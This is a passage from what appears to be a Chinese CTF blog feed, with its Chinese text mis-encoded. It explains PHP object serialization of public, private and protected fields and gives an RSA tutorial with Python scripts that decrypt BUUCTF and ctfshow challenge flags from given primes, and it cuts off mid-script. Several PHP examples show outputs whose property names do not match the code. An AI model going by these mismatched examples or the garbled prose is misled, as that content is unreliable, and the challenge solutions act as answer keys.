class="headerlink" title="public"></a>public</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$test2</span>=<span class="hljs-string">&quot;hello&quot;</span>;<br>&#125;<br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> test();<br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$test</span>);  <br></code></pre></td></tr></table></figure><p>è¿è¡Œç»“æœï¼š<br><img src="https://img-blog.csdnimg.cn/20201123231004661.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è€Œåœ¨ç½‘é¡µä¸­è¿è¡Œçš„ç»“æœ:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;test&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;test1&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;hello&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>publicåºåˆ—åŒ–åçš„å‚æ•°å˜æˆ <code>test1</code></p><h3 id="private"><a href="#private" class="headerlink" title="private"></a>private</h3><blockquote><p>private å£°æ˜çš„å­—æ®µä¸ºç§æœ‰å­—æ®µï¼Œåªåœ¨æ‰€å£°æ˜çš„ç±»ä¸­å¯è§ï¼Œåœ¨è¯¥ç±»çš„å­ç±»å’Œè¯¥ç±»çš„å¯¹è±¡å®ä¾‹ä¸­å‡ä¸å¯è§ã€‚å› æ­¤ç§æœ‰å­—æ®µçš„å­—æ®µååœ¨åºåˆ—åŒ–æ—¶ï¼Œç±»åå’Œå­—æ®µåå‰é¢éƒ½ä¼šåŠ ä¸Š\0çš„å‰ç¼€ã€‚å­—ç¬¦ä¸²é•¿åº¦ä¹ŸåŒ…æ‹¬æ‰€åŠ å‰ç¼€çš„é•¿åº¦ã€‚å…¶ä¸­ \0 å­—ç¬¦ä¹Ÿæ˜¯è®¡ç®—é•¿åº¦çš„ã€‚</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$test1</span>=<span class="hljs-string">&quot;hello&quot;</span>;<br>&#125;<br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> test();<br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$test</span>);  <br></code></pre></td></tr></table></figure><p>è¿è¡Œç»“æœï¼š<br><img src="https://img-blog.csdnimg.cn/20201123231030686.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è€Œåœ¨ç½‘é¡µä¸­è¿è¡Œçš„ç»“æœ:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;test&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;\00test\00test2&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;hello&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>privateåºåˆ—åŒ–åçš„å‚æ•°è¢«ååºåˆ—åŒ–åå˜æˆ <code>\00test\00test2</code> </p><h3 id="protected"><a href="#protected" class="headerlink" title="protected"></a>protected</h3><blockquote><p>protected å£°æ˜çš„å­—æ®µä¸ºä¿æŠ¤å­—æ®µï¼Œåœ¨æ‰€å£°æ˜çš„ç±»å’Œè¯¥ç±»çš„å­ç±»ä¸­å¯è§ï¼Œä½†åœ¨è¯¥ç±»çš„å¯¹è±¡å®ä¾‹ä¸­ä¸å¯è§ã€‚å› æ­¤ä¿æŠ¤å­—æ®µçš„å­—æ®µååœ¨åºåˆ—åŒ–æ—¶ï¼Œå­—æ®µåå‰é¢ä¼šåŠ ä¸Š\0<em>\0çš„å‰ç¼€ã€‚è¿™é‡Œçš„ \0 è¡¨ç¤º ASCII ç ä¸º 0 çš„å­—ç¬¦(ä¸å¯è§å­—ç¬¦)ï¼Œè€Œä¸æ˜¯ \0ç»„åˆã€‚è¿™ä¹Ÿè®¸è§£é‡Šäº†ï¼Œä¸ºä»€ä¹ˆå¦‚æœç›´æ¥åœ¨ç½‘å€ä¸Šï¼Œä¼ é€’\0</em>\0usernameä¼šæŠ¥é”™ï¼Œå› ä¸ºå®é™…ä¸Šå¹¶ä¸æ˜¯\0ï¼Œåªæ˜¯ç”¨å®ƒæ¥ä»£æ›¿ASCIIå€¼ä¸º0çš„å­—ç¬¦ã€‚å¿…é¡»ç”¨pythonä¼ å€¼æ‰å¯ä»¥ã€‚</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$test3</span>=<span class="hljs-string">&quot;hello&quot;</span>;<br>&#125;<br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> test();<br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$test</span>);  <br></code></pre></td></tr></table></figure><p>è¿è¡Œç»“æœï¼š<br><img src="https://img-blog.csdnimg.cn/20201123230813337.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è€Œåœ¨ç½‘é¡µä¸­è¿è¡Œçš„ç»“æœ:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;test&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;\00*\00test3&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;hello&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>protectedåºåˆ—åŒ–åçš„å‚æ•°å˜æˆ <code>\00*\00test3</code></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>WEB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RSAç®—æ³•è¯¦è§£ä¸ç»ƒä¹ </title>
    <link href="/2020/10/04/RSA%E7%AE%97%E6%B3%95%E8%AF%A6%E8%A7%A3%E4%B8%8E%E7%BB%83%E4%B9%A0/"/>
    <url>/2020/10/04/RSA%E7%AE%97%E6%B3%95%E8%AF%A6%E8%A7%A3%E4%B8%8E%E7%BB%83%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p>æ‘˜è¦ï¼šåšé¢˜é‡åˆ°çš„ä¸€äº›RSAè„šæœ¬</p><a id="more"></a><h2 id="1-ä»€ä¹ˆæ˜¯RSA"><a href="#1-ä»€ä¹ˆæ˜¯RSA" class="headerlink" title="1. ä»€ä¹ˆæ˜¯RSA"></a>1. ä»€ä¹ˆæ˜¯RSA</h2><p>1977å¹´ï¼Œéº»çœç†å·¥å­¦é™¢çš„ Ron Rivestã€Adi Shamir å’Œ Leonard Adleman å…±åŒæå‡ºäº†ä¸€ç§éå¯¹ç§°åŠ å¯†ç®—æ³•ï¼Œç”¨ä»–ä»¬ä¸‰äººçš„å§“æ°ç¼©å†™å‘½åä¸º RSAã€‚RSA æ—¢ä¸æ˜¯æƒŸä¸€ï¼Œä¹Ÿä¸æ˜¯æœ€æ—©çš„éå¯¹ç§°åŠ å¯†ç®—æ³•ã€‚ä½†å®ƒæ˜¯ä½¿ç”¨æœ€å¹¿æ³›ï¼Œå› è€Œä¹Ÿæ˜¯æœ€é‡è¦çš„éå¯¹ç§°åŠ å¯†ç®—æ³•ã€‚</p><h2 id="2-RSAç®—æ³•æè¿°"><a href="#2-RSAç®—æ³•æè¿°" class="headerlink" title="2. RSAç®—æ³•æè¿°"></a>2. RSAç®—æ³•æè¿°</h2><h3 id="2-1-äº§ç”Ÿå…¬ç§å¯†é’¥å¯¹"><a href="#2-1-äº§ç”Ÿå…¬ç§å¯†é’¥å¯¹" class="headerlink" title="2.1 äº§ç”Ÿå…¬ç§å¯†é’¥å¯¹"></a>2.1 äº§ç”Ÿå…¬ç§å¯†é’¥å¯¹</h3><blockquote><p>1.éšæœºé€‰æ‹©ä¸¤ä¸ªä¸ç›¸ç­‰çš„è´¨æ•°på’Œqã€‚<br>2.è®¡ç®—på’Œqçš„ä¹˜ç§¯n(n=p*q),nçš„é•¿åº¦å°±æ˜¯å¯†é’¥é•¿åº¦ã€‚<br>3.è®¡ç®—nçš„æ¬§æ‹‰å‡½æ•°Ï†(n)ï¼š Ï†(n) = (p-1)(q-1)<br>4.éšæœºé€‰æ‹©ä¸€ä¸ªæ•´æ•°eï¼Œä¹Ÿå°±æ˜¯å…¬é’¥å½“ä¸­ç”¨æ¥åŠ å¯†çš„é‚£ä¸ªæ•°å­— æ¡ä»¶æ˜¯1&lt; e &lt; Ï†(n)ï¼Œä¸”eä¸Ï†(n) äº’è´¨ã€‚<br>5.å–eçš„æ¨¡åæ•°dï¼Œè®¡ç®—æ–¹æ³•ä¸º:e * d â‰¡ 1 (mod Ï†)<br>6.å°†nå’Œeå°è£…æˆå…¬é’¥ï¼Œnå’Œdå°è£…æˆç§é’¥ï¼Œï¼ˆnï¼Œe),(nï¼Œd)å°±æ˜¯å¯†é’¥å¯¹ã€‚</p></blockquote><p>è¡¥å……è¯´æ˜:<br>1.ä¸‹é¢ä»£ç ä¸­ä½¿ç”¨<code>phi</code>ä»£æ›¿æ¬§æ‹‰å‡½æ•°Ï†(n)<br>2.å¦‚æœä¸¤ä¸ªæ­£æ•´æ•°eå’Œnäº’è´¨ï¼Œé‚£ä¹ˆä¸€å®šå¯ä»¥æ‰¾åˆ°æ•´æ•°dï¼Œä½¿å¾— e * d - 1 è¢«næ•´é™¤ï¼Œæˆ–è€…è¯´e * dè¢«né™¤çš„ä½™æ•°æ˜¯1ã€‚è¿™æ—¶ï¼Œdå°±å«åšeçš„â€œæ¨¡åå…ƒç´ â€ã€‚</p><h3 id="2-2-RSAåŠ å¯†"><a href="#2-2-RSAåŠ å¯†" class="headerlink" title="2.2 RSAåŠ å¯†"></a>2.2 RSAåŠ å¯†</h3><p> é¦–å…ˆå¯¹æ˜æ–‡è¿›è¡Œæ¯”ç‰¹ä¸²åˆ†ç»„ï¼Œä½¿å¾—æ¯ä¸ªåˆ†ç»„å¯¹åº”çš„åè¿›åˆ¶æ•°å°äºnï¼Œç„¶åä¾æ¬¡å¯¹æ¯ä¸ªåˆ†ç»„måšä¸€æ¬¡åŠ å¯†ï¼Œæ‰€æœ‰åˆ†ç»„çš„å¯†æ–‡æ„æˆçš„åºåˆ—å°±æ˜¯åŸå§‹æ¶ˆæ¯çš„åŠ å¯†ç»“æœï¼Œå³mæ»¡è¶³0&lt;=m&lt;nï¼Œåˆ™åŠ å¯†ç®—æ³•ä¸ºï¼š<br> <code>câ‰¡ m^e mod n</code>; cä¸ºå¯†æ–‡ï¼Œä¸”0&lt;=c&lt;nã€‚ ï¼ˆè¿˜å¯ä»¥è¡¨ç¤ºä¸ºc = pow(m, e, Nï¼‰<br> <img src="https://img-blog.csdnimg.cn/20201004174827178.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ä¹Ÿå°±æ˜¯è¯´RSAåŠ å¯†æ˜¯å¯¹æ˜æ–‡çš„Eæ¬¡æ–¹åé™¤ä»¥Nåæ±‚ä½™æ•°çš„è¿‡ç¨‹ã€‚åªè¦çŸ¥é“Eå’ŒNå°±å¯ä»¥è¿›è¡ŒRSAåŠ å¯†äº†ï¼Œæ‰€ä»¥è¯´Eã€Næ˜¯RSAåŠ å¯†çš„å¯†é’¥ï¼Œä¹Ÿå°±æ˜¯è¯´Eå’ŒNçš„ç»„åˆå°±æ˜¯å…¬é’¥ã€‚å³<code>å…¬é’¥=(E,N)</code></p><h3 id="2-3-RSAè§£å¯†"><a href="#2-3-RSAè§£å¯†" class="headerlink" title="2.3 RSAè§£å¯†"></a>2.3 RSAè§£å¯†</h3><p>å¯¹äºå¯†æ–‡0&lt;=c&lt;nï¼Œè§£å¯†ç®—æ³•ä¸ºï¼š <code>mâ‰¡ c^d mod n</code>;ï¼ˆè¿˜å¯ä»¥è¡¨ç¤ºä¸ºm = pow(c, d, N)ï¼‰</p><p><img src="https://img-blog.csdnimg.cn/20201004113320969.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä¹Ÿå°±æ˜¯è¯´å¯¹å¯†æ–‡è¿›è¡ŒDæ¬¡æ–¹åé™¤ä»¥Nçš„ä½™æ•°å°±æ˜¯æ˜æ–‡ï¼Œè¿™å°±æ˜¯RSAè§£å¯†è¿‡ç¨‹ã€‚çŸ¥é“Då’ŒNå°±èƒ½è¿›è¡Œè§£å¯†å¯†æ–‡äº†ï¼Œæ‰€ä»¥Då’ŒNçš„ç»„åˆå°±æ˜¯ç§é’¥ã€‚å³<code>ç§é’¥=(D,N)</code></p><h3 id="2-4-RSAç›¸å…³å€¼"><a href="#2-4-RSAç›¸å…³å€¼" class="headerlink" title="2.4 RSAç›¸å…³å€¼"></a>2.4 RSAç›¸å…³å€¼</h3><table><thead><tr><th>å€¼</th><th>å«ä¹‰</th></tr></thead><tbody><tr><td>p å’Œ q</td><td>ä¸¤ä¸ªä¸ç›¸ç­‰çš„è´¨æ•°</td></tr><tr><td>n</td><td>å¤§æ•´æ•°nï¼Œç§°ä¹‹ä¸ºæ¨¡æ•°</td></tr><tr><td>e å’Œ d</td><td>äº’ä¸ºæ¨¡åæ•°çš„ä¸¤ä¸ªæŒ‡æ•°</td></tr><tr><td>c å’Œ m</td><td>åˆ†åˆ«æ˜¯å¯†æ–‡å’Œæ˜æ–‡</td></tr></tbody></table><h2 id="3-å®‰è£…gmpy2"><a href="#3-å®‰è£…gmpy2" class="headerlink" title="3. å®‰è£…gmpy2"></a>3. å®‰è£…gmpy2</h2><p>æ£€æŸ¥ä¸€ä¸‹æ˜¯å¦å®‰è£…äº†wheelæ–‡ä»¶åŒ…ï¼Œåœ¨cmdä¸­è¾“å…¥<code>wheel</code>ï¼ŒæŸ¥çœ‹ä¸€ä¸‹<br><img src="https://img-blog.csdnimg.cn/20201004171147495.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å¦‚æœæ²¡æœ‰å®‰è£…ï¼Œåˆ™è¾“å…¥<code>pip install wheel</code>å®‰è£…<br><img src="https://img-blog.csdnimg.cn/20201004171222132.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å®‰è£…å¥½wheelåï¼Œè¿˜éœ€è¦å†å®‰è£…gmpy2æ‰€éœ€è¦çš„whlæ–‡ä»¶ï¼ŒæŸ¥æ‰¾éœ€è¦çš„<a href="https://www.lfd.uci.edu/~gohlke/pythonlibs/">whlæ–‡ä»¶åŒ…</a>ã€‚æ³¨æ„ï¼Œwhlæ–‡ä»¶åŒ…éœ€è¦å’Œä½ æ‰€å®‰è£…çš„python3ç‰ˆæœ¬ä¸€è‡´ï¼›</p><p>è¾“å…¥pythonæŸ¥çœ‹ç”µè„‘Pythonç‰ˆæœ¬æ‰€æ”¯æŒçš„whlæ–‡ä»¶ç‰ˆæœ¬<br><img src="https://img-blog.csdnimg.cn/2020100417135991.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä½¿ç”¨çš„æ˜¯python3.8 32ä½ï¼Œä¸‹è½½gmpy2â€‘2.0.8â€‘cp38â€‘cp38â€‘win32.whlï¼Œæ”¾åˆ°pythonæ–‡ä»¶ç›®å½•ä¸‹ã€‚<br><img src="https://img-blog.csdnimg.cn/20201004172026759.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ç„¶åå†åœ¨cmdä¸­è¾“å…¥ï¼špip install ï¼ˆwhlæ–‡ä»¶çš„è·¯å¾„ï¼‰<br><img src="https://img-blog.csdnimg.cn/20201004172409410.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æœ€åè¾“å…¥ï¼š<code>pip install gmpy2</code>å°±å¯ä»¥å®‰è£…ï¼Œæ²¡æœ‰æŠ¥é”™å³å®‰è£…æˆåŠŸ<br><img src="https://img-blog.csdnimg.cn/2020100417261163.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="4-å®æˆ˜ç»ƒä¹ "><a href="#4-å®æˆ˜ç»ƒä¹ " class="headerlink" title="4. å®æˆ˜ç»ƒä¹ "></a>4. å®æˆ˜ç»ƒä¹ </h2><h3 id="4-1-å·²çŸ¥pã€qã€eï¼Œæ±‚d"><a href="#4-1-å·²çŸ¥pã€qã€eï¼Œæ±‚d" class="headerlink" title="4.1 å·²çŸ¥pã€qã€eï¼Œæ±‚d"></a>4.1 å·²çŸ¥pã€qã€eï¼Œæ±‚d</h3><p><strong>[BUUCTF]RSA</strong><br><img src="https://img-blog.csdnimg.cn/20201005193350346.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ç¼–å†™è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br>p = <span class="hljs-number">473398607161</span><br>q = <span class="hljs-number">4511491</span><br>e = <span class="hljs-number">17</span><br>d = gmpy2.invert(e,(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br>print(d)<br></code></pre></td></tr></table></figure><p>è¿è¡Œå¾—åˆ°<br><img src="https://img-blog.csdnimg.cn/20201005193500626.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h3 id="4-2-1-å·²çŸ¥pã€qã€eã€å¯†æ–‡cï¼Œæ±‚æ˜æ–‡m"><a href="#4-2-1-å·²çŸ¥pã€qã€eã€å¯†æ–‡cï¼Œæ±‚æ˜æ–‡m" class="headerlink" title="4.2.1 å·²çŸ¥pã€qã€eã€å¯†æ–‡cï¼Œæ±‚æ˜æ–‡m"></a>4.2.1 å·²çŸ¥pã€qã€eã€å¯†æ–‡cï¼Œæ±‚æ˜æ–‡m</h3><p><strong>[BUUCTF] rsarsa</strong></p><p>æ‰“å¼€æ–‡æ¡£ï¼Œç»™å‡ºäº†pã€qã€eçš„å€¼<br><img src="https://img-blog.csdnimg.cn/20200930105157902.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><em>æ–¹æ³•ä¸€</em>ï¼šä½¿ç”¨RSAtoolå·¥å…·<br>ä½¿ç”¨rsatoolå·¥å…·è®¡ç®—dçš„å€¼ï¼Œç›´æ¥å¡«å…¥p,q,æŠŠe =  65537è½¬æ¢ä¸º16è¿›åˆ¶åœ¨å†å¡«å…¥ï¼Œå†ç‚¹å‡»Calc.D,å³å¯è·å¾—Dçš„å€¼ã€‚<br><img src="https://img-blog.csdnimg.cn/20200930105901703.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç„¶åç¼–å†™è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">p = <span class="hljs-number">9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483</span><br>q = <span class="hljs-number">11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407</span><br>C = <span class="hljs-number">83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034</span><br>d = <span class="hljs-number">56632047571190660567520341028861194862411428416862507034762587229995138605649836960220619903456392752115943299335385163216233744624623848874235303309636393446736347238627793022725260986466957974753004129210680401432377444984195145009801967391196615524488853620232925992387563270746297909112117451398527453977</span><br>n = p*q<br>flag = <span class="hljs-built_in">pow</span>(C,d,n)<br>print(flag)<br></code></pre></td></tr></table></figure><p>å¾—åˆ°æ˜æ–‡flag<br><img src="https://img-blog.csdnimg.cn/20200930110203438.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><em>æ–¹æ³•äºŒ</em>ï¼šåˆ©ç”¨<code>gmpy2</code>ç›´æ¥å†™è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br>p = <span class="hljs-number">9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483</span><br>q = <span class="hljs-number">11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407</span><br>e = <span class="hljs-number">65537</span><br>C = <span class="hljs-number">83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034</span><br><span class="hljs-comment">#1.æ±‚d</span><br>d = gmpy2.invert(e,(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br><span class="hljs-comment">#2.æ±‚n</span><br>n = p*q<br><span class="hljs-comment">#3.m=pow(c,d,n)</span><br>flag = <span class="hljs-built_in">pow</span>(C,d,n)<br>print(flag)<br></code></pre></td></tr></table></figure><p>å¾—åˆ°æ˜æ–‡flag<br><img src="https://img-blog.csdnimg.cn/20201004194955531.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h3 id="4-2-2-å·²çŸ¥cã€qã€nã€eï¼Œæ±‚æ˜æ–‡m"><a href="#4-2-2-å·²çŸ¥cã€qã€nã€eï¼Œæ±‚æ˜æ–‡m" class="headerlink" title="4.2.2 å·²çŸ¥cã€qã€nã€eï¼Œæ±‚æ˜æ–‡m"></a>4.2.2 å·²çŸ¥cã€qã€nã€eï¼Œæ±‚æ˜æ–‡m</h3><p><a href="https://www.cnblogs.com/shenshuoyaoyouguang/p/14025343.html">å‚è€ƒæ–‡ç« </a><br>ç»™äº† c, q, n ,e</p><p>æ±‚ p : n//q</p><p>æ±‚ d: d = invmod(e,(p-1)*(q-1))</p><p>æ±‚ flag : flag = pow(c,d,n)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> libnum<br><br>n = <span class="hljs-number">191051885543358947736760989661967468461742175898801910645529003886391047898839624568290216360845330501814019720570327197669064365268607597117598905046895097642708006373182989953758208523010345148200475257538336602695211819055893667974317905617522838840325499754862033348148407978527792816186094297381925119601464149</span><br>q = <span class="hljs-number">166836705584681518148179737955842605213272207836752187845124149461151181903779374775281529346854786259719545699157508885500818994019618158708212777833768444327658647324555090459233657737950932895018766440119999513331707759691054888319029069397903003240927552065429412176600134636921146805408664505115889561043</span><br>c = <span class="hljs-number">177177672061025662936587345347268313127241651965256882323180749317515733256088163186914550682635245294414879862810654773207644687262596440870094409378849307188485755700138797651039936445998433830516207630858733090581643592843521203499818069822504434370840254518614785953412492701730326524258672860416318501278155194</span><br>e = <span class="hljs-number">0x10001</span><br><br>p = n//q<br>print(p)<br><br>d = libnum.invmod(e,(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br>print(d)<br><br>i = <span class="hljs-built_in">pow</span>(c,d,n)<br>print(libnum.n2s(i))<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201129000806367.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h3 id="4-3-å·²çŸ¥nã€eã€å¯†æ–‡cï¼Œæ±‚æ˜æ–‡m"><a href="#4-3-å·²çŸ¥nã€eã€å¯†æ–‡cï¼Œæ±‚æ˜æ–‡m" class="headerlink" title="4.3 å·²çŸ¥nã€eã€å¯†æ–‡cï¼Œæ±‚æ˜æ–‡m"></a>4.3 å·²çŸ¥nã€eã€å¯†æ–‡cï¼Œæ±‚æ˜æ–‡m</h3><p><strong>[ctfshow]easyrsa1</strong><br><img src="https://img-blog.csdnimg.cn/20201004200123150.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>åˆ†è§£è´¨å› æ•°n<br><img src="https://img-blog.csdnimg.cn/202010042038209.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ç¼–å†™è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">import</span> binascii<br><br>e = <span class="hljs-number">65537</span><br>n = <span class="hljs-number">1455925529734358105461406532259911790807347616464991065301847</span><br>c = <span class="hljs-number">69380371057914246192606760686152233225659503366319332065009</span><br><span class="hljs-comment">#1.å°†nåˆ†è§£ä¸ºpå’Œq</span><br>p = <span class="hljs-number">1201147059438530786835365194567</span><br>q = <span class="hljs-number">1212112637077862917192191913841</span><br><br>phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>) <br><span class="hljs-comment">#2.æ±‚d</span><br>d = gmpy2.invert(e,phi)<br><span 